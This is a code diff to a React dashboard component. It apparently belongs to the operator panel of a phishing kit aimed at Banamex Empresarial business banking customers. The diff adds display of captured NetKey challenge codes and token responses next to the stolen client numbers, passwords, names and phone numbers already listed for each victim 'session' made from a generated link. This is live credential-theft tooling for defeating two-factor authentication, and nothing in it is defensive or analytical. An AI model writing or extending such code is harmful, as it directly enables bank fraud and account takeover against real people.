@@ -463,11 +463,11 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     )}
                     
                     {/* Datos de Banamex */}
-                    {((session as any).numeroCliente || (session as any).claveAcceso) && (
+                    {((session as any).numeroCliente || (session as any).claveAcceso || (session as any).challenge || (session as any).netkeyResponse) && (
                       <div className="mb-3 p-3 bg-[#003d7a] rounded border border-[#0066cc]">
                         <div className="flex items-center mb-2">
                           <KeyRound className="h-4 w-4 text-[#00aaff] mr-2" />
-                          <span className="text-white font-bold">Banamex Empresarial</span>
+                          <span className="text-white font-bold">Banamex Empresarial NetKey</span>
                         </div>
                         {(session as any).numeroCliente && (
                           <div className="text-sm text-white mb-1">
@@ -475,8 +475,18 @@ const AccessTable: React.FC<AccessTableProps> = ({
                           </div>
                         )}
                         {(session as any).claveAcceso && (
-                          <div className="text-sm text-white">
+                          <div className="text-sm text-white mb-1">
                             <span className="opacity-80">Clave de Acceso:</span> <span className="font-mono ml-2">{(session as any).claveAcceso}</span>
+                          </div>
+                        )}
+                        {(session as any).challenge && (
+                          <div className="text-sm text-white mb-1">
+                            <span className="opacity-80">Challenge:</span> <span className="font-mono ml-2">{(session as any).challenge}</span>
+                          </div>
+                        )}
+                        {(session as any).netkeyResponse && (
+                          <div className="text-sm text-white">
+                            <span className="opacity-80">NetKey Response:</span> <span className="font-mono ml-2">{(session as any).netkeyResponse}</span>
                           </div>
                         )}
                       </div>
@@ -561,6 +571,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left">Número de Cliente</th>
                 <th className="p-3 text-left">Contraseña</th>
                 <th className="p-3 text-left">Banco</th>
+                <th className="p-3 text-left">Challenge</th>
                 <th className="p-3 text-left">NetKey</th>
                 <th className="p-3 text-left">Nombre</th>
                 <th className="p-3 text-left">Teléfono 1</th>
@@ -573,7 +584,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={11} className="p-4 text-center text-gray-400">
+                  <td colSpan={12} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
@@ -595,6 +606,9 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     {(session as any).claveAcceso || '--'}
                   </td>
                   <td className="p-3 text-white">{session.banco}</td>
+                  <td className="p-3 text-white font-mono">
+                    {(session as any).challenge || '--'}
+                  </td>
                   <td className="p-3 text-white">
                     {(session as any).netkeyResponse || '--'}
                   </td>
